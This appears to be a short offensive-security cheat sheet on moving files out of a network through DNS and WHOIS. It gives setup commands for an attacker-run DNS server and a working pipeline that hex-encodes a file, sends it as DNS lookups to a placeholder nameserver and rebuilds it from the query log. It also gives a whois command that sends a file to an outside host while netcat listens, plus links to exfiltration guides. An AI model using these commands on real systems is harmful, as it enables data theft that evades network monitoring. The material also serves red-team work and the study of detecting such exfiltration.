# DNS

## 01 - Unix Shell

### 1.1 - Hex Encoded DNS Exfiltration

TODO: Provide a step process for exfiltrating DNS server on the attacker machine

#### 1.1.1 - Setup

##### 1.1.1.1 - BIND9

```
$ sudo apt install bind9
```

##### 1.1.1.2 - Dnsmasq

```
$ sudo apt install dnsmasq
```

#### 1.1.2 - Usage

```
$ xxd -p file.txt > file.hex

$ while read line; do drill $line.<nameserver_dns_server>; done < file.hex

$ egrep -o [0-9a-f]*.<nameserver_dns_server> /var/lib/bind/query.log | cut -d . -f 1 | uniq > file.hex

$ xxd -r -p file.hex > file.txt
```

### 1.2 - Whois

```
$ whois -h <IP> -p 43 `cat /path/to/file.txt`

$ sudo nc -lnvp 43
```

## References

- [NotSoSecure: Out of Band Exploitation (OOB) CheatSheet](https://notsosecure.com/out-band-exploitation-oob-cheatsheet)

- [DNS exfiltration of data: step-by-step simple guide](https://hinty.io/devforth/dns-exfiltration-of-data-step-by-step-simple-guide/)

- [Setting Up Your Own Malicious DNS Server For Data Exfiltration (Without a DNS Server)](https://john-woodman.com/research/dns-exfiltration-setup/)

- [Deploy Self hosted interactsh-server for Blind & Out of Band Testing](https://takshilp.medium.com/oob-blind-testing-using-dns-exfiltration-54bcc004a0fb)